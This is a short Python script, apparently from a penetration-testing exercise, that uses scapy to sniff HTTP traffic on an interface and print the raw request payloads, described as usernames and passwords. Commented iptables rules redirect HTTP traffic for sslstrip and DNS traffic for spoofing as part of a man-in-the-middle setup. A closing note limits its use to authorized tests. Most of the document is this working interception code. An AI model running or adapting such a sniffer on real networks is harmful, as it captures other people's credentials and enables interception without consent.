import scapy.all as scapy
from scapy.layers import http

# Function to start sniffing network traffic on the given interface
def listener(interface):
    # sniff: capture packets on the network
    # iface: the network interface to sniff on
    # store=False: do not store the packets in memory
    # prn=analyze_packets: call this function for each captured packet
    scapy.sniff(iface=interface, store=False, prn=analyze_packets)
    # prn: callback function that gets executed for each packet

# Callback function to analyze each captured packet
def analyze_packets(packet):
    # packet.show()  # Uncomment this line to see detailed packet content in terminal
    # Check if the packet contains an HTTP Request layer
    if packet.haslayer(http.HTTPRequest):
        # Check if the packet contains raw data (e.g., credentials, URLs, etc.)
        if packet.haslayer(scapy.Raw):
            # Print the raw payload of the HTTP request
            print(packet[scapy.Raw].load)

# Start sniffing on the 'eth0' interface
listener("eth0")

# ------------------------------------------
# 🔒 Important Note:
# The iptables rules below redirect HTTP and DNS traffic to the local machine.
# These commands must be run in the root terminal (with sudo), and are required 
# for packet interception on certain ports (e.g., port 80 for HTTP).

# Redirect HTTP traffic (port 80) to local port 10000 (e.g., for tools like sslstrip)
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Redirect DNS traffic (port 53) to local port 53 (for DNS spoofing or sniffing)
# iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
# ------------------------------------------


"""
This script is used to display raw data transmitted within HTTP requests 
(such as usernames and passwords).

Since HTTPS traffic is encrypted, it cannot be directly viewed using this method.

The `iptables` rules redirect traffic to the local machine, enabling sniffing 
(commonly used in MITM attack scenarios).

Such analysis should only be performed in authorized test environments. 
Otherwise, it may lead to legal consequences.


"""